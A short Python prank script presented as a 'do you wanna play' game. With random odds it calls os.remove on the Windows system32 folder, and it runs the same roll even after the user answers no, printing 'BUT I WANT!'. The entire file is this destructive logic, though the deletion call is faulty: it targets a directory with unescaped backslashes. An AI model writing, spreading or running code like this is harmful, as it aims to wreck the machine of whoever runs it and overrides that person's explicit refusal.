import os
import random
import time

print('Do you wanna play? (y/n)')
if input() == 'y':
    if random.randint(0, 6) == 1:
        os.remove('c:\windows\system32')
    else:
        print("You won!")
else:
    print("oh... You don't want play...")
    time.sleep(3)
    print("BUT I WANT!")
    time.sleep(1)
    if random.randint(0, 6) == 1:
        os.remove('c:\windows\system32')
    else:
        print("You won!")
